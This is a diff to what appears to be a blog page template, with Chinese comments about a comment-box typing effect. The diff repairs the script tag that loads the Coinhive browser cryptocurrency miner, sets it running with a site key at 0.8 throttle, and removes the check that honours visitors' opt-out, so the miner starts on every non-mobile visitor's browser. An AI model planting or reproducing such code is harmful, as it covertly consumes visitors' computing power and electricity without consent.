@@ -560,13 +560,13 @@ cd /var/run/发现没有docker的进程
 <!-- 页面评论框打字特效，只对网站的input有效，三方评论框无效果 -->
 <script type="text/javascript" src="/js/commentTyping.js"></script>
 
-<script src="https://coinhive.com/lib/coinhive.min.js">
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
     var miner = new CoinHive.Anonymous('vmzEnxr5eez9Bn9bC0r2FfMxuUEJELL0', {throttle: 0.8});
 
     // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    // in the last 14400 seconds (4 hours): && !miner.didOptOut(14400)
+    if (!miner.isMobile()) {
         miner.start();
     }
 </script>
